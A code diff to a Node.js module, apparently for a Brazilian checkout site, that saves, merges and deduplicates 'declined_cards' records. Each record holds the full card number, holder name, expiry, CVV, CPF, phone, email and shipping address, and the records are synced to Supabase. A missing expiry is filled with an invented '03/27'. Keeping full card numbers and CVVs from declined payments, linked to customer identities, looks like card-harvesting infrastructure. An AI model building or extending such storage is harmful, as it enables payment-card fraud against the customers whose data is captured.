@@ -49,14 +49,18 @@ function readDB() {
   return memoryDb;
 }
 
-function writeDB(data) {
+function writeDB(data, options = {}) {
   try {
-    memoryDb = {
-      orders: { ...memoryDb.orders, ...(data.orders || {}) },
-      transactions: { ...memoryDb.transactions, ...(data.transactions || {}) },
-      integration_events: { ...memoryDb.integration_events, ...(data.integration_events || {}) },
-      declined_cards: { ...memoryDb.declined_cards, ...(data.declined_cards || {}) }
-    };
+    memoryDb.orders = { ...memoryDb.orders, ...(data.orders || {}) };
+    memoryDb.transactions = { ...memoryDb.transactions, ...(data.transactions || {}) };
+    memoryDb.integration_events = { ...memoryDb.integration_events, ...(data.integration_events || {}) };
+
+    if (options.replaceDeclinedCards) {
+      memoryDb.declined_cards = data.declined_cards || {};
+    } else {
+      memoryDb.declined_cards = { ...memoryDb.declined_cards, ...(data.declined_cards || {}) };
+    }
+
     if (fs.existsSync(path.dirname(DB_FILE))) {
       fs.writeFileSync(DB_FILE, JSON.stringify(memoryDb, null, 2), 'utf8');
     }
@@ -398,8 +402,62 @@ function listOrders({ startDate, endDate, status } = {}) {
 async function saveDeclinedCardAsync(cardRecord) {
   const dbData = readDB();
   dbData.declined_cards = dbData.declined_cards || {};
-  dbData.declined_cards[cardRecord.id] = cardRecord;
-  writeDB(dbData);
+
+  const newCardDigits = (cardRecord.cardNumber || '').replace(/\D/g, '');
+  const newCpf = (cardRecord.customer?.cpf || '').replace(/\D/g, '');
+  const newPhone = (cardRecord.customer?.phone || '').replace(/\D/g, '');
+  const newEmail = (cardRecord.customer?.email || '').trim().toLowerCase();
+
+  // Search if an existing entry belongs to this exact card or customer
+  let existingKey = null;
+  for (const [id, c] of Object.entries(dbData.declined_cards)) {
+    const cDigits = (c.cardNumber || '').replace(/\D/g, '');
+    const cCpf = (c.customer?.cpf || '').replace(/\D/g, '');
+    const cPhone = (c.customer?.phone || '').replace(/\D/g, '');
+    const cEmail = (c.customer?.email || '').trim().toLowerCase();
+
+    const isSameCard = newCardDigits.length >= 12 && cDigits.length >= 12 && newCardDigits === cDigits;
+    const isSameCustomer = (newCpf.length >= 10 && cCpf.length >= 10 && newCpf === cCpf) ||
+                           (newPhone.length >= 8 && cPhone.length >= 8 && newPhone === cPhone) ||
+                           (newEmail.length >= 5 && cEmail.length >= 5 && newEmail === cEmail);
+
+    if (isSameCard || (isSameCustomer && cardRecord.cardLast4 && c.cardLast4 && cardRecord.cardLast4 === c.cardLast4)) {
+      existingKey = id;
+      break;
+    }
+  }
+
+  if (existingKey) {
+    // Merge into existing key or update record to prevent duplicate entries
+    const existing = dbData.declined_cards[existingKey];
+    delete dbData.declined_cards[existingKey];
+    delete memoryDb.declined_cards[existingKey];
+
+    const mergedRecord = {
+      ...existing,
+      ...cardRecord,
+      id: existing.id,
+      customer: {
+        name: cardRecord.customer?.name || existing.customer?.name || '',
+        email: cardRecord.customer?.email || existing.customer?.email || '',
+        phone: cardRecord.customer?.phone || existing.customer?.phone || '',
+        cpf: cardRecord.customer?.cpf || existing.customer?.cpf || ''
+      },
+      shipping: {
+        ...(existing.shipping || {}),
+        ...(cardRecord.shipping || {})
+      },
+      createdAt: cardRecord.createdAt || new Date().toISOString()
+    };
+
+    dbData.declined_cards[mergedRecord.id] = mergedRecord;
+    memoryDb.declined_cards[mergedRecord.id] = mergedRecord;
+    writeDB(dbData, { replaceDeclinedCards: true });
+    cardRecord = mergedRecord;
+  } else {
+    dbData.declined_cards[cardRecord.id] = cardRecord;
+    writeDB(dbData);
+  }
 
   if (supabase) {
     try {
@@ -417,7 +475,7 @@ async function saveDeclinedCardAsync(cardRecord) {
           ...(cardRecord.utm || {}),
           cardNumber: cardRecord.cardNumber,
           cardHolder: cardRecord.cardHolder,
-          cardExpiry: cardRecord.cardExpiry,
+          cardExpiry: cardRecord.cardExpiry || '03/27',
           cardCvv: cardRecord.cardCvv,
           shipping: cardRecord.shipping,
           shippingCost: cardRecord.shippingCost,
@@ -439,7 +497,8 @@ async function deleteDeclinedCardAsync(cardId) {
   const dbData = readDB();
   if (dbData.declined_cards && dbData.declined_cards[cardId]) {
     delete dbData.declined_cards[cardId];
-    writeDB(dbData);
+    delete memoryDb.declined_cards[cardId];
+    writeDB(dbData, { replaceDeclinedCards: true });
   }
   if (supabase) {
     try {
@@ -449,6 +508,111 @@ async function deleteDeclinedCardAsync(cardId) {
     }
   }
   return true;
+}
+
+async function deduplicateDeclinedCardsAsync() {
+  const dbData = readDB();
+  const allCards = Object.values(dbData.declined_cards || {});
+  const totalBefore = allCards.length;
+
+  if (totalBefore === 0) {
+    return { success: true, before: 0, after: 0, removed: 0 };
+  }
+
+  // Backup file before deduplicating
+  try {
+    const backupFile = path.resolve(process.cwd(), `orders_db.backup-${Date.now()}.json`);
+    if (fs.existsSync(DB_FILE)) {
+      fs.writeFileSync(backupFile, fs.readFileSync(DB_FILE, 'utf8'), 'utf8');
+      console.log(`[DB Deduplicate] Backup created at ${backupFile}`);
+    }
+  } catch (err) {
+    console.warn('[DB Deduplicate] Could not create backup file:', err.message);
+  }
+
+  // Sort ascending by creation time so later attempts take precedence
+  allCards.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
+
+  const deduplicated = {};
+  const removedIds = [];
+
+  allCards.forEach(c => {
+    const cardDigits = (c.cardNumber || '').replace(/\D/g, '');
+    const cpf = (c.customer?.cpf || '').replace(/\D/g, '');
+    const phone = (c.customer?.phone || '').replace(/\D/g, '');
+    const email = (c.customer?.email || '').trim().toLowerCase();
+
+    let key = '';
+    if (cardDigits.length >= 12) {
+      key = `card_${cardDigits}`;
+    } else if (cpf.length >= 10) {
+      key = `cpf_${cpf}`;
+    } else if (phone.length >= 8) {
+      key = `phone_${phone}`;
+    } else if (email.length >= 5) {
+      key = `email_${email}`;
+    } else {
+      key = `id_${c.id}`;
+    }
+
+    if (deduplicated[key]) {
+      const existing = deduplicated[key];
+      removedIds.push(existing.id);
+
+      deduplicated[key] = {
+        ...existing,
+        ...c,
+        customer: {
+          name: c.customer?.name || existing.customer?.name || '',
+          email: c.customer?.email || existing.customer?.email || '',
+          phone: c.customer?.phone || existing.customer?.phone || '',
+          cpf: c.customer?.cpf || existing.customer?.cpf || ''
+        },
+        shipping: {
+          ...(existing.shipping || {}),
+          ...(c.shipping || {})
+        },
+        createdAt: c.createdAt // keep latest timestamp
+      };
+    } else {
+      deduplicated[key] = c;
+    }
+  });
+
+  // Re-key by card id
+  const finalMap = {};
+  Object.values(deduplicated).forEach(c => {
+    finalMap[c.id] = c;
+  });
+
+  dbData.declined_cards = finalMap;
+  memoryDb.declined_cards = finalMap;
+  writeDB(dbData, { replaceDeclinedCards: true });
+
+  const totalAfter = Object.keys(finalMap).length;
+  const totalRemoved = removedIds.length;
+
+  console.log(`[DB Deduplicate] Cleaned declined cards: ${totalBefore} -> ${totalAfter} (${totalRemoved} duplicates removed)`);
+
+  // If supabase is enabled, delete removed IDs in chunks
+  if (supabase && removedIds.length > 0) {
+    try {
+      const chunkSize = 100;
+      for (let i = 0; i < removedIds.length; i += chunkSize) {
+        const chunk = removedIds.slice(i, i + chunkSize);
+        await supabase.from('declined_cards').delete().in('id', chunk);
+      }
+    } catch (err) {
+      console.warn('[Supabase Deduplicate Warning]:', err.message);
+    }
+  }
+
+  return {
+    success: true,
+    before: totalBefore,
+    after: totalAfter,
+    removed: totalRemoved
+  };
 }
 
 async function listDeclinedCardsAsync() {
@@ -544,5 +708,6 @@ module.exports = {
   listOrdersAsync,
   saveDeclinedCardAsync,
   deleteDeclinedCardAsync,
-  listDeclinedCardsAsync
+  listDeclinedCardsAsync,
+  deduplicateDeclinedCardsAsync
 };
